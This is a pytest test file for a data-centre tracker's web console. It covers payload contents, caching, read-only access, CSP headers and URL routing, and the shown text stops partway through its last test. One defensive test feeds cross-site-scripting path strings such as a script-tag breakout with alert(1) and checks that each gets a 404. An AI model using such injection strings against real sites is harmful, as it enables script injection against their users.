"""The console's HTTP surface, and the boundary that keeps it safe.

Most of this file is about the runner. The read side is a thin wrapper over
modules that already have their own tests, but `POST /api/run` turns a JSON body
into a subprocess, and everything that stops that being a remote shell is
asserted here: the catalog rejects what it does not know, argv is a list built
from validated flags, a command that spends money needs its name typed back, and
two runs cannot overlap.
"""

from __future__ import annotations

import datetime as dt
import json
import os
import re
import sys
import threading
from http.client import HTTPConnection
from pathlib import Path

import pytest

from tracker.db import init_db, session_scope
from tracker.ingest.records import IngestRecord, RiskRecord, SourceRecord
from tracker.upsert import upsert_record
from tracker.vocab import TRACKED_FIELDS
from tracker.webui import assets, catalog
from tracker.webui import server as server_module
from tracker.webui.runner import Busy, Runner
from tracker.webui.server import Console, Handler

T0 = dt.datetime(2026, 1, 10, 12, 0, 0)

#: How often a test server's loop checks whether it has been asked to stop.
#: `serve_forever` looks once per `poll_interval`, half a second by default, and
#: `shutdown()` blocks until it next does — so every server here spent 0.51 s
#: stopping: 84 fixture teardowns and six servers started inside a test, about
#: 45 s of the suite. `tracker serve` keeps the default; nothing waits on it there.
FAST_POLL = {"poll_interval": 0.01}


@pytest.fixture
def seeded_db(tmp_path, migrated_copy):
    """A real database file with one fully-populated project."""
    path = migrated_copy(tmp_path / "tracker.db")
    engine, _ = init_db(path)
    with session_scope(engine) as session:
        upsert_record(
            session,
            IngestRecord(
                project={
                    "company": "Microsoft",
                    "name": "Fairwater",
                    "city": "Mount Pleasant",
                    "state": "WI",
                },
                sources=[
                    SourceRecord(
                        url="https://news.microsoft.com/fairwater/",
                        source_type="company_filing",
                        fetched_at=T0,
                        excerpt="The campus will draw 900 MW.",
                        claims={
                            "name": "Fairwater",
                            "company": "Microsoft",
                            "city": "Mount Pleasant",
                            "state": "WI",
                            "mw_planned": 900.0,
                            "phase": "construction",
                        },
                        quotes={"mw_planned": "will draw 900 MW"},
                    )
                ],
                risks=[
                    RiskRecord(
                        category="transmission",
                        severity="material",
                        summary="Two 345-kV upgrades outstanding.",
                        quote="must complete two 345-kilovolt upgrades",
                        source_url="https://news.microsoft.com/fairwater/",
                    )
                ],
            ),
        )
    return path


@pytest.fixture
def server(seeded_db):
    """A live console on an ephemeral loopback port."""
    from http.server import ThreadingHTTPServer

    console = Console(seeded_db)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    thread = threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True)
    thread.start()
    try:
        yield httpd.server_address, console
    finally:
        httpd.shutdown()
        httpd.server_close()
        console.close()


def headers_for(address, path):
    """Response headers, lowercased, for the cache-policy assertions."""
    conn = HTTPConnection(*address, timeout=30)
    conn.request("GET", path)
    response = conn.getresponse()
    response.read()
    conn.close()
    return {k.lower(): v for k, v in response.getheaders()}


def request(address, path, method="GET", body=None):
    conn = HTTPConnection(*address, timeout=30)
    payload = json.dumps(body) if body is not None else None
    conn.request(method, path, body=payload, headers={"Content-Type": "application/json"})
    response = conn.getresponse()
    raw = response.read().decode("utf-8")
    conn.close()
    try:
        return response.status, json.loads(raw)
    except ValueError:
        return response.status, raw


# --- the read surface -------------------------------------------------------


def test_dataset_carries_the_shape_the_page_expects(server):
    address, _ = server
    status, data = request(address, "/api/dataset")
    assert status == 200
    # Every key here is read by `app.js` or by the vendored maps, which read
    # `projects` and `phases` off `window.DCTRACKER` directly.
    for key in (
        "projects",
        "totals",
        "tracks",
        "riskTrack",
        "riskCategories",
        "riskSeverities",
        "phases",
        "sourceWeight",
        "gaps",
        "kwPerH200",
        "version",
    ):
        assert key in data, f"{key} missing from the dataset"
    assert data["totals"]["projects"] == 1
    # The index the maps and the pickers read: identity and the headline numbers,
    # and nothing a reader has to click a row to see.
    listed = data["projects"][0]
    assert listed["name"] and listed["state"]
    assert "prov" not in listed and "sources" not in listed


def test_the_shell_payload_ships_nothing_the_page_does_not_read(server, seeded_db):
    """`queue`, `failed`, `feeds`, `required` and `exposure` rode on every load.

    Measured on a copy of production they were 113 KB of the raw payload, and
    nothing in `app.js` or the vendored map code reads any of them — they were
    views the console had and lost, carried forward because `light()` was built
    by copying `build()`. The terminal interface does draw them, and it still
    gets them from `build()`.
    """
    from tracker.db import open_db, session_scope
    from tracker.webui import assets
    from tracker.webui.dataset import build

    unread = ("queue", "failed", "feeds", "required", "exposure")
    address, _ = server
    _status, data = request(address, "/api/dataset")
    for key in unread:
        assert key not in data, f"{key} is back in the shell payload"

    front_end = "".join(
        (assets.STATIC_ROOT / name).read_text(encoding="utf-8")
        for name in ("app.js", "views-help.js", "vendor/dc-map.js", "vendor/dc-map3d.js")
    )
    for key in unread:
        assert f"data.{key}" not in front_end and f"DCTRACKER.{key}" not in front_end, key

    with session_scope(open_db(seeded_db), commit=False) as session:
        whole = build(session, db_path=str(seeded_db), schema_version=1)
    assert all(key in whole for key in unread), "the terminal interface still reads them"


def test_the_light_index_always_carries_risks(server):
    """A contract with vendored code, and its failure mode is a blank map.

    `static/vendor/dc-map.js` and `dc-map3d.js` both call `p.risks.some(...)`
    unguarded, and the 3D one reads `window.DCTRACKER.projects` directly rather
    than taking props. A row without the array throws a TypeError inside a custom
    element: no error reaches the page, the map simply does not draw.
    """
    address, _ = server
    _status, data = request(address, "/api/dataset")
    assert data["projects"], "expected at least one project"
    for project in data["projects"]:
        assert isinstance(project["risks"], list)


def test_a_table_row_carries_the_two_things_the_page_cannot_compute(server):
    """Moved off /api/dataset with the rest of the per-project detail.

    The tier and the sentence behind a value are what the underline under it
    means, and they must arrive **with the row** — hovering is instant, and a
    fetch on mouseover would make the provenance system feel optional.
    """
    address, _ = server
    _status, page = request(address, "/api/projects")
    project = page["rows"][0]
    assert project["standing"]["tracks"], "per-track standing must come from the backend"
    assert project["prov"]["mw_planned"]["quote"] == "will draw 900 MW"
    assert project["prov"]["mw_planned"]["quote_is_exact"] is True


def test_dataset_carries_the_capex_rollup(server):
    """The buyer axis, and the duplicate warning that belongs beside it.

    On its own route since the rollup was measured at 304ms of the shell
    payload's 406ms — five views of six were paying for arithmetic they never
    show.
    """
    address, _ = server
    _status, capex = request(address, "/api/capex")
    assert set(capex) >= {
        "coverage",
        "positions",
        "years",
        "year_columns",
        "quarter_columns",
        "as_of_year",
        "suspect",
        "duplicates",
    }
    # `evidence` names what raised each pair. Five classes, and they are not equal —
    # one carries an unattended merge and another is a word — so the class arrives
    # computed rather than being inferred in the browser.
    assert set(capex["duplicates"]) == {
        "groups",
        "double_counted_mw",
        "shared_blocks",
        "evidence",
        "group_evidence",
    }
    # And the class each group is best described by arrives named, not ranked in the
    # browser: five classes where one permits an unattended merge and another is a
    # word is exactly the judgement `docs/architecture.md` says is computed once.
    for group in capex["duplicates"]["group_evidence"]:
        assert set(group) == {"ids", "kind", "label"}
        assert group["label"]
    # The browser renders the column list; it never computes one of its own.
    assert all(isinstance(y, int) for y in capex["year_columns"])
    # Microsoft is a hyperscaler in the company list, so it is its own customer.
    position = next(p for p in capex["positions"] if p["key"] == "microsoft")
    assert position["self_built"] == 1
    assert position["mw_planned"] == 900.0
    # The disclosure fields ride on positions, not on `duplicates`, so the
    # exact-set assertion above stays true.
    assert position["investment_excluded_usd"] == 0
    assert position["duplicate_rows_skipped"] == 0
    # Groups carry ids only; the page looks the rows up in `projects` rather than
    # being sent a second copy that can disagree with the first.
    assert all(isinstance(i, int) for g in capex["duplicates"]["groups"] for i in g)


def test_a_programme_total_says_so_rather_than_just_being_amber(tmp_path):
    """Both causes of 待确认 sit at one tier, and they need opposite work.

    An unquoted value needs another source. A programme total quoted in an
    article about one campus needs correcting — going looking for a citation
    would find one, and it would still be the wrong number. The ingest path
    records which it is; this proves the console can still tell.
    """
    from tracker.ingest.crawl import SCALE_NOTE_FIELD, SCALE_NOTE_MARKER, _implausible_investment
    from tracker.webui.dataset import build

    note = _implausible_investment({"investment_usd": 100_000_000_000, "mw_planned": 1200.0})
    assert note and SCALE_NOTE_MARKER in note

    path = tmp_path / "scale.db"
    engine, _ = init_db(path)
    with session_scope(engine) as session:
        upsert_record(
            session,
            IngestRecord(
                project={
                    "company": "Brookfield",
                    "name": "Paducah",
                    "city": "Paducah",
                    "state": "KY",
                },
                sources=[
                    SourceRecord(
                        url="https://example.test/paducah",
                        source_type="trade_press",
                        fetched_at=T0,
                        excerpt="The investment could total roughly $100 billion over time.",
                        claims={
                            "name": "Paducah",
                            "company": "Brookfield",
                            "city": "Paducah",
                            "state": "KY",
                            "mw_planned": 1200.0,
                            "investment_usd": 100_000_000_000,
                            "expected_online": dt.date(2028, 1, 1),
                        },
                        unconfirmed=frozenset({"investment_usd", "expected_online"}),
                        # What the gate decided, recorded per field (migration
                        # 0013). This used to be reconstructed by string-matching
                        # a marker in the project's notes, which could only ever
                        # see the scale demotion — the second field below had no
                        # way to say anything about itself.
                        unconfirmed_reasons=(
                            ("expected_online", "no_quote"),
                            ("investment_usd", "out_of_scale"),
                        ),
                    )
                ],
                notes=[note],
            ),
        )
    with session_scope(engine, commit=False) as session:
        payload = build(session, db_path=str(path), schema_version=7)

    because = payload["projects"][0]["unconfirmed_because"]
    assert because[SCALE_NOTE_FIELD]["code"] == "out_of_scale"
    assert "programme-wide total" in because[SCALE_NOTE_FIELD]["note"]

    # The distinction is the whole point: same amber tier, different work.
    assert because["expected_online"]["code"] == "no_quote"
    assert because["expected_online"]["note"] != because[SCALE_NOTE_FIELD]["note"]


def test_the_utilitys_plant_is_filed_apart_from_the_campus(tmp_path):
    """Hyperion (#10) showed Entergy's gas and solar among its own halls.

    Every sum already excluded them — a plant's nameplate output and a data
    center's IT load are different quantities — so the tranche list said one thing
    while the arithmetic below it said another, and the console's "delivering"
    figure was adding running gas units into the campus.

    Moved, not dropped: gas built *for* this campus is one of the most important
    facts about it. It belongs under power rather than under capacity.
    """
    from tracker.ingest.records import BlockRecord
    from tracker.webui.dataset import build

    path = tmp_path / "generation.db"
    engine, _ = init_db(path)
    with session_scope(engine) as session:
        upsert_record(
            session,
            IngestRecord(
                project={"company": "Meta", "name": "Hyperion", "city": "Richland", "state": "LA"},
                sources=[
                    SourceRecord(
                        url="https://example.test/hyperion",
                        source_type="trade_press",
                        fetched_at=T0,
                        excerpt="Building 1 is 200 MW; Entergy is building 2,262 MW of gas.",
                        claims={"name": "Hyperion", "company": "Meta", "state": "LA"},
                        blocks=[
                            BlockRecord(label="Building 1", mw=200.0, status="under_construction"),
                            BlockRecord(
                                label="Franklin Farms Gas Plants", mw=2262.0, status="permitting"
                            ),
                        ],
                    )
                ],
            ),
        )
    with session_scope(engine, commit=False) as session:
        payload = build(session, db_path=str(path), schema_version=7)

    project = payload["projects"][0]
    assert [b["label"] for b in project["blocks"]] == ["Building 1"]
    assert [s["label"] for s in project["serving"]] == ["Franklin Farms Gas Plants"]
    assert [s["label"] for s in project["sections"]] == ["Building 1"]
    # And it is still accounted for by name, rather than vanishing from the sums.
    reasons = {r["reason"] for r in project["accounting"]["residuals"]}
    assert "generation" in reasons


def test_a_merely_unquoted_value_claims_no_reason(server):
    """The common case must not borrow the rarer one's explanation."""
    address, _ = server
    _status, page = request(address, "/api/projects")
    assert page["rows"][0]["unconfirmed_because"] == {}


def test_reading_the_dataset_does_not_write(server, seeded_db, logical_snapshot):
    """A read route opens the database mode=ro; prove it stays untouched.

    The same guarantee the read commands carry, and it matters more here: a
    server answers requests the operator did not consciously issue. Compared
    logically rather than by bytes — see the `logical_snapshot` fixture for why a
    byte comparison is flaky under WAL.
    """
    address, _ = server
    before = logical_snapshot(seeded_db)
    for path in (
        "/api/dataset",
        "/api/health",
        "/api/publishers",
        "/api/updates",
        "/api/claims?project=1",
    ):
        assert request(address, path)[0] == 200
    assert logical_snapshot(seeded_db) == before


# --- one engine, and a cache a commit anywhere invalidates ---------------------


def _second_project(db_path):
    """A commit from another connection, the way a `tracker` command makes one."""
    from tracker.db import open_db, session_scope

    with session_scope(open_db(db_path, readonly=False)) as session:
        upsert_record(
            session,
            IngestRecord(
                project={"company": "xAI", "name": "Colossus", "city": "Memphis", "state": "TN"},
                sources=[
                    SourceRecord(
                        url="https://x.ai/colossus",
                        source_type="company_filing",
                        fetched_at=T0,
                        excerpt="Colossus will draw 300 MW.",
                        claims={
                            "name": "Colossus",
                            "company": "xAI",
                            "city": "Memphis",
                            "state": "TN",
                            "mw_planned": 300.0,
                        },
                    )
                ],
            ),
        )


def test_the_console_opens_the_database_once_rather_than_per_request(server):
    """Every request used to build a new engine: three metadata queries and a read
    of every migration file first (~6 ms), and the engines were never disposed —
    twelve SQLite connections open after a hundred requests, measured. Counted here
    as new DB-API connections, which a per-request engine makes every time."""
    from sqlalchemy import event
    from sqlalchemy.pool import Pool

    connected: list[int] = []

    def count(*_args) -> None:
        connected.append(1)

    address, _ = server
    event.listen(Pool, "connect", count)
    try:
        for _ in range(10):
            for path in ("/api/dataset", "/api/projects", "/api/updates", "/api/project?id=1"):
                assert request(address, path)[0] == 200
    finally:
        event.remove(Pool, "connect", count)
    assert len(connected) <= 2, f"{len(connected)} new connections for forty requests"


def test_an_unchanged_database_is_answered_from_the_cache(server, monkeypatch):
    """The four heavy reads are computed once while nothing commits."""
    from tracker import sources
    from tracker.webui import dataset

    calls: dict[str, int] = {}

    def counting(name, real):
        def wrapped(*args, **kwargs):
            calls[name] = calls.get(name, 0) + 1
            return real(*args, **kwargs)

        return wrapped

    monkeypatch.setattr(dataset, "light", counting("light", dataset.light))
    monkeypatch.setattr(dataset, "capex_bundle", counting("capex", dataset.capex_bundle))
    monkeypatch.setattr(dataset, "articles", counting("articles", dataset.articles))
    monkeypatch.setattr(sources, "survey", counting("survey", sources.survey))

    address, _ = server
    for _ in range(3):
        for path in ("/api/dataset", "/api/capex", "/api/articles", "/api/publishers"):
            assert request(address, path)[0] == 200
        request(address, "/api/capex/overview/stream", "POST", {"key": "microsoft"})
    assert calls == {"light": 1, "capex": 1, "articles": 1, "survey": 1}, (
        "the hover card shares the capex rollup rather than computing its own"
    )


def test_a_commit_from_another_process_is_seen_on_the_next_request(server, seeded_db):
    """The console is not the writer, so the cache is keyed on SQLite's own count of
    other connections' commits (`PRAGMA data_version`) rather than on a timer."""
    address, _ = server
    paths = ("/api/dataset", "/api/capex", "/api/articles", "/api/publishers")
    before = {path: request(address, path)[1] for path in paths}
    assert before["/api/dataset"]["totals"]["projects"] == 1
    assert before["/api/articles"]["totals"]["publishers"] == 1

    _second_project(seeded_db)

    assert request(address, "/api/dataset")[1]["totals"]["projects"] == 2
    buyers = {p["key"] for p in request(address, "/api/capex")[1]["positions"]}
    assert "xai" in buyers, "the capex rollup was served from before the commit"
    assert request(address, "/api/articles")[1]["totals"]["publishers"] == 2
    citations = request(address, "/api/publishers")[1]["sources"]["citations"]
    assert citations == before["/api/publishers"]["sources"]["citations"] + 1


def test_the_cache_never_carries_one_readers_account_to_another(seeded_db):
    """The shell payload is cached; who is reading it is not."""
    from http.server import ThreadingHTTPServer

    _account(seeded_db, "alice@example.com")
    _account(seeded_db, "bob@example.com")
    console = Console(seeded_db)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        address = httpd.server_address
        _, alice = sign_in(address, email="alice@example.com")
        _, bob = sign_in(address, email="bob@example.com")
        for cookie, email in ((alice, "alice@example.com"), (bob, "bob@example.com")) * 2:
            _status, data = as_reader(address, cookie, "/api/dataset")
            assert data["account"]["email"] == email
    finally:
        httpd.shutdown()
        httpd.server_close()
        console.close()


def test_a_replaced_database_file_gets_a_new_engine(server, seeded_db, monkeypatch):
    """`scripts/sync_db.py` renames a new file over the old one, and a connection
    opened before the rename reads the old file for as long as it lives. The file's
    identity is checked on every use, and a different file is opened afresh.

    The identity is faked rather than the file replaced, because Windows refuses to
    rename over a file that is open — the host is where this happens for real."""
    from tracker.webui import reads

    address, console = server
    assert request(address, "/api/dataset")[0] == 200
    first = console.reads.engine()

    real = reads.file_identity
    monkeypatch.setattr(reads, "file_identity", lambda path: (*real(path)[:1], -1))
    assert request(address, "/api/dataset")[0] == 200
    assert console.reads.engine() is not first, "the replaced file is still being read"


def test_twenty_readers_at_once_cost_one_computation(seeded_db):
    """A miss is computed once however many requests arrive for it together."""
    import time as clock

    from tracker.webui.reads import ReadSide

    side = ReadSide(seeded_db)
    computed: list[int] = []

    def slow() -> str:
        computed.append(1)
        clock.sleep(0.2)
        return "answer"

    results: list[str] = []
    threads = [
        threading.Thread(target=lambda: results.append(side.cached("k", slow))) for _ in range(20)
    ]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    side.close()
    assert computed == [1]
    assert results == ["answer"] * 20


def test_an_answer_computed_across_a_commit_is_not_served_after_it(seeded_db):
    """Stored under the version read *before* computing, so a commit that lands
    mid-computation leaves an entry the next request does not match."""
    from tracker.webui.reads import ReadSide

    side = ReadSide(seeded_db)
    answers = iter(["during the commit", "after it"])

    def committing() -> str:
        _second_project(seeded_db)
        return next(answers)

    assert side.cached("k", committing) == "during the commit"
    assert side.cached("k", lambda: next(answers)) == "after it"
    side.close()


def test_the_publishers_route_answers_who_decided(server):
    """What Sources fills its "decided" column from.

    Its own route rather than a field on `/api/dataset`, which is refetched after
    every run: the survey costs about 0.24s on the live database.
    """
    address, _ = server
    status, data = request(address, "/api/publishers")
    assert status == 200
    assert data["sources"]["citations"] >= 0
    assert data["sources"]["publishers"] >= 0
    for host in data["sources"]["top"]:
        assert host["host"]


def _statements_for(address, path) -> int:
    """How many SQL statements one request issues, across every engine."""
    from sqlalchemy import event
    from sqlalchemy.engine import Engine

    issued: list[int] = []

    def count(*_args) -> None:
        issued.append(1)

    event.listen(Engine, "before_cursor_execute", count)
    try:
        assert request(address, path)[0] == 200
    finally:
        event.remove(Engine, "before_cursor_execute", count)
    return len(issued)


def test_the_publisher_survey_reads_every_citation_in_one_pass(server, seeded_db):
    """It read one project's citations at a time: 486 queries on a copy of
    production, 239 ms. The count is now a property of the survey, not of the
    database — asked with one project and again with two."""
    address, _ = server
    assert request(address, "/api/dataset")[0] == 200  # the engine opened, the accounts counted
    one = _statements_for(address, "/api/publishers")
    _second_project(seeded_db)  # a commit, so the next request recomputes
    assert request(address, "/api/dataset")[0] == 200
    assert _statements_for(address, "/api/publishers") == one


def test_the_updates_route_is_the_landing_page(server):
    """Signed, ranked, and honest about which clock the window is on."""
    address, _ = server
    status, data = request(address, "/api/updates?days=3650")
    assert status == 200
    assert data["watching_everything"] is True, "no watchlist means the whole database"
    assert data["days"] == 3650
    assert isinstance(data["watchlist"], list)
    assert set(data["counts"]) == {"good", "bad", "total", "notify"}
    for signal in data["signals"]:
        assert signal["sign"] in {"good", "bad", "neutral"}
        assert signal["unconfirmed"] is None, "an unquoted signal belongs in held[]"
        # Both clocks, always: one of them alone is a lie in one direction.
        assert "at" in signal and "happened" in signal


def test_the_updates_route_refuses_a_window_it_cannot_read(server):
    """A silently ignored filter and an empty week look identical on the page."""
    address, _ = server
    assert request(address, "/api/updates?days=soon")[0] == 400
    assert request(address, "/api/updates?days=0")[0] == 400
    assert request(address, "/api/updates?since=lastweek")[0] == 400


def test_a_published_console_can_read_with_a_model_without_being_writable(seeded_db):
    """The two risks are different, so they are two flags.

    The LLM panels — the briefing, `infer`, the capex overview — *read* a row and
    spend tokens. `tracker infer` has never written its answer anywhere. They were
    gated on `allow_write` anyway, so the published console refused the one thing
    it could safely offer while `--no-run` was doing double duty.

    That flag is gone — nothing here writes but a watchlist — and this is what is
    left of the argument: spending is still its own switch, so a console can be
    published with the panels off without that meaning anything else.
    """
    from http.server import ThreadingHTTPServer

    console = Console(seeded_db, allow_ai=True)
    assert console.allow_ai
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    thread = threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True)
    thread.start()
    try:
        address = httpd.server_address
        # There is no command to spawn any more; the route is gone entirely.
        status, _ = request(address, "/api/run", method="POST", body={"cmd": "stats", "flags": {}})
        assert status == 404
        # The model panel is no longer refused *for being read-only*. It may still
        # fail for want of a key, which is a different answer and not a 403.
        status, _ = request(
            address, "/api/infer", method="POST", body={"project_id": 1, "confirm": "infer"}
        )
        assert status != 403, "an AI-enabled console must not refuse this as read-only"
        # And the page is told, so the panel renders as a button rather than a shrug.
        dataset = request(address, "/api/dataset")[1]
        assert dataset["allow_ai"] is True
        assert "allow_write" not in dataset, "there is nothing left for it to describe"
    finally:
        httpd.shutdown()
        httpd.server_close()


def test_the_api_index_lists_every_route_the_handler_serves(server):
    """The index is hand-written, so a new route must be added to it deliberately.

    Written for whoever drives this from a terminal rather than a browser — an
    agent included — because "what can I ask this server?" had no answer short of
    reading `_route_get`. Hand-written for the reason `catalog.GROUPS` is: a
    derived list describes the code, and a caller needs to know what a route is
    *for*. This test is what stops it rotting.
    """
    import re

    address, _ = server
    status, data = request(address, "/api")
    assert status == 200
    assert "consoles" not in data, "there is one face now, so the index does not list two"

    documented = {route.split(" ", 1)[1] for route in data["routes"]}
    source = (Path(server_module.__file__)).read_text(encoding="utf-8")
    dispatched = set(re.findall(r'route == "(/api/[a-z/]*)"', source))
    dispatched |= set(re.findall(r'parsed\.path == "(/api/[a-z/]*)"', source))
    missing = dispatched - documented
    assert not missing, f"routes the handler serves but /api does not document: {missing}"


def test_the_read_routes_do_not_collide_with_the_ai_overview(server):
    """`/api/overview` is the POST that writes a project's AI reading.

    A second handler named `_overview` silently shadowed it — Python keeps the
    last definition — so every GET arrived at a handler expecting a body. Nothing
    reads at that path now, and this is what says so.
    """
    address, _ = server
    assert request(address, "/api/publishers")[0] == 200
    assert request(address, "/api/updates")[0] == 200
    # GET on the AI overview path is not a route at all.
    assert request(address, "/api/overview")[0] == 404


def test_the_page_references_no_external_host(server):
    """Same guarantee `tracker export html` makes, for the same reason."""
    address, _ = server
    status, body = request(address, "/")
    assert status == 200
    for host in ("unpkg.com", "cdn.jsdelivr.net", "fonts.googleapis.com", "fonts.gstatic.com"):
        assert host not in body, f"the shell reaches out to {host}"


def test_the_csp_stays_shut_except_for_framing(server):
    """The sources modal frames a cited article, so `frame-src` was added.

    Pinned here because a relaxation nobody is watching creeps: everything except
    framing must still be same-origin, and `default-src 'self'` must survive.

    **`'self'` is asserted, not assumed.** Naming `frame-src` at all replaces the
    fallback chain to `default-src`, so `frame-src https:` on its own forbade the
    console's own reader frame — the browser blocked it and the modal came up
    empty, with the only evidence in a console message nobody reads.
    """
    address, _ = server
    conn = HTTPConnection(*address, timeout=30)
    conn.request("GET", "/api/health")
    csp = conn.getresponse().headers["Content-Security-Policy"]
    conn.close()

    assert "default-src 'self'" in csp
    assert "frame-src 'self' https:" in csp
    for directive in ("script-src 'self'", "connect-src 'self'", "img-src 'self'"):
        assert directive in csp, f"{directive} was loosened along with frame-src"
    assert "frame-src *" not in csp and "frame-src http:" not in csp


def test_every_view_has_its_own_url(server):
    """A page you cannot link to, refresh or reach with the back button is a tab.

    The server does not render them differently — it stamps which view the URL
    asked for so a deep link opens on it directly instead of painting the default
    and swapping.
    """
    address, _ = server
    for path in ("/updates", "/projects", "/sources", "/map", "/capex", "/help"):
        status, body = request(address, path)
        assert status == 200, path
        assert f'window.DC_VIEW="{path.strip("/")}"' in body

    # `/dev` was the second face, and it went with the runner. It must 404 rather
    # than fall through to the console, or a stale bookmark reads as a broken link.
    for gone in ("/dev", "/dev/", "/dev/pipeline", "/dev/commands"):
        assert request(address, gone)[0] == 404, gone


def test_an_unknown_path_is_a_404_not_the_console(server):
    """Otherwise a typo lands silently on Updates and reads as a broken link."""
    address, _ = server
    for path in ("/nonsense", "/projectss", "/dev/nope"):
        status, _ = request(address, path)
        assert status == 404, path


def test_the_server_and_the_front_end_agree_on_the_view_names(server):
    """Two lists, one truth. The server needs them to 404 an unknown path; the
    bundle needs them to draw the nav. A test is cheaper than generating one from
    the other."""
    app = (assets.STATIC_ROOT / "app.js").read_text(encoding="utf-8")
    for view in server_module.READ_VIEWS:
        assert f'["{view}", "' in app, f"{view} is routed but not in VIEWS"
    # And the other direction, which is the one that rotted: a view drawn in the
    # nav but not routed is a tab whose own URL 404s. Read out of the `VIEWS`
    # array specifically — the drawer's tabs are written the same way and are not
    # routes, so a looser pattern picks up `stats`, `blocks` and `risks`.
    import re

    block = re.search(r"const VIEWS = \[(.*?)\];", app, re.S)
    assert block, "app.js no longer declares a VIEWS array"
    drawn = set(re.findall(r'\["([a-z]+)", "', block.group(1)))
    assert drawn == set(server_module.READ_VIEWS), f"nav={drawn} routed={server_module.READ_VIEWS}"


def test_the_claim_tables_are_not_in_the_list_payload(server):
    """They were 48% of a 19 MB response, for a table that renders one project at
    a time on a page most visits never open."""
    address, _ = server
    _status, page = request(address, "/api/projects")
    assert page["rows"], "expected at least one project"
    for project in page["rows"]:
        assert "claims_by_field" not in project
        # What the table itself still needs is still there.
        assert "prov" in project and "standing" in project


def test_a_table_row_carries_no_citation_list(server):
    """Citations were 30% of the old payload and the table shows their number.

    The articles themselves are the sources view's whole subject, and it asks for
    them on its own route — so the row carries the count and the drill-down
    carries the list, rather than every view paying for every citation.
    """
    address, _ = server
    _status, page = request(address, "/api/projects")
    row = page["rows"][0]
    assert "sources" not in row
    assert isinstance(row["n_sources"], int) and row["n_sources"] >= 1

    _status, whole = request(address, f"/api/project?id={row['id']}")
    assert len(whole["project"]["sources"]) == row["n_sources"]


def test_a_table_row_carries_no_audit_log(server, seeded_db):
    """`notes` is a project's running audit log — every duplicate warning, every
    derivation the write path explained — and nothing in the page reads it.

    Measured on a copy of production: 4.4 KB a row at the median, so a 200-row page
    was 433 KB gzipped with it and 198 KB without. It stays on the project's own
    payload, which is one row and the export shape.
    """
    from sqlalchemy import update

    from tracker.db import open_db, session_scope
    from tracker.models import Project

    with session_scope(open_db(seeded_db, readonly=False)) as session:
        session.execute(update(Project).values(notes="possible duplicate of project #284"))

    address, _ = server
    _status, page = request(address, "/api/projects")
    row = page["rows"][0]
    assert "notes" not in row
    _status, whole = request(address, f"/api/project?id={row['id']}")
    assert whole["project"]["notes"] == "possible duplicate of project #284"


def test_one_projects_claims_are_fetchable_on_their_own(server):
    address, _ = server
    _status, data = request(address, "/api/dataset")
    pid = data["projects"][0]["id"]

    status, payload = request(address, f"/api/claims?project={pid}")
    assert status == 200
    assert payload["project"] == pid
    assert isinstance(payload["claims_by_field"], dict)

    assert request(address, "/api/claims?project=999999")[0] == 404
    assert request(address, "/api/claims?project=nope")[0] == 400


def test_one_project_has_its_own_page(server):
    """The project is the thing this database is about, and it had no URL.

    Detail lived in a drawer: React state, no path, so a project could not be
    linked, refreshed or reached with the back button. The same test that pins
    the six views says why that is not good enough — "a page you cannot link to,
    refresh or reach with the back button is a tab".
    """
    address, _ = server
    _status, data = request(address, "/api/dataset")
    pid = data["projects"][0]["id"]

    status, body = request(address, f"/projects/{pid}")
    assert status == 200
    # Both globals, because the front end needs to know which view AND which row.
    assert 'window.DC_VIEW="projects"' in body
    assert f"window.DC_PROJECT={pid}" in body

    # A list view carries no project, and `null` is what JavaScript reads for it.
    assert "window.DC_PROJECT=null" in request(address, "/projects")[1]


def test_a_project_path_that_is_not_an_id_is_a_404(server):
    """Same rule the view paths follow: a typo is visible, not a default page."""
    address, _ = server
    for path in (
        "/projects/abc",
        "/projects/1/x",
        "/projects/-1",
        "/projects/1.0",
        "/projects/2e3",
    ):
        assert request(address, path)[0] == 404, path

    # A trailing slash is the collection, not a malformed member: `route.strip("/")`
    # has folded `/projects/` onto `/projects` since before this route existed.
    assert request(address, "/projects/")[0] == 200


def test_a_project_path_cannot_inject_script_into_the_shell(server):
    """`window.DC_PROJECT` is interpolated into a `<script>` unescaped.

    That is safe only because `_PROJECT_PATH` matches digits and `_route_get`
    parses them to an `int` — so nothing but a number can reach the string. This
    test is here because the comment saying so is not a mechanism, and widening
    that pattern is a script-injection bug rather than a styling choice.

    The property asserted is that the shell is never served for such a path, so
    nothing reaches the interpolation. The 404 body does echo the route it
    refused — but it is `application/json` under `X-Content-Type-Options:
    nosniff`, so a browser cannot be talked into running it as markup.
    """
    address, _ = server
    for attack in (
        '/projects/1"></script><script>alert(1)</script>',
        "/projects/1;alert(1)",
        "/projects/1%22%3E%3Cscript%3E",
        "/projects/<script>",
    ):
        status, body = request(address, attack)
        assert status == 404, attack
        assert "window.DC_PROJECT" not in str(body), attack
        assert "<div id=" not in str(body), attack


def test_one_project_is_fetchable_whole_with_its_claims(server):
    """What the page reads, and the one way it differs from the list payload.

    `claims_by_field` is 48% of the list payload and is left out of it. A page
    whose subject is one project should not be limited by a decision taken to
    keep a 300-row table small, so this route includes it.
    """
    address, _ = server
    _status, data = request(address, "/api/dataset")
    pid = data["projects"][0]["id"]

    status, payload = request(address, f"/api/project?id={pid}")
    assert status == 200
    assert payload["project"]["id"] == pid
    assert isinstance(payload["project"]["claims_by_field"], dict)

    assert request(address, "/api/project?id=999999")[0] == 404
    assert request(address, "/api/project?id=nope")[0] == 400


def test_the_project_page_and_the_table_cannot_disagree(server):
    """A table row is `project_payload` minus a named list, and nothing else.

    Both go through one builder because two would drift, and the page would then
    show a different `filled` count or a different obstacle rationale than the
    row the reader clicked — a contradiction with no visible cause. Since the row
    is now a *subtraction* from the page's payload, that is what this checks, in
    both directions: everything the row has, the page has and agrees about; and
    what the page has and the row does not is exactly the declared list.

    Without this, "built by subtraction" is a comment. With it, a second builder
    cannot be introduced quietly.
    """
    from tracker.webui.dataset import LIST_OMITS, RISK_LIST_FIELDS, STANDING_OMITS

    address, _ = server
    _status, listing = request(address, "/api/projects")
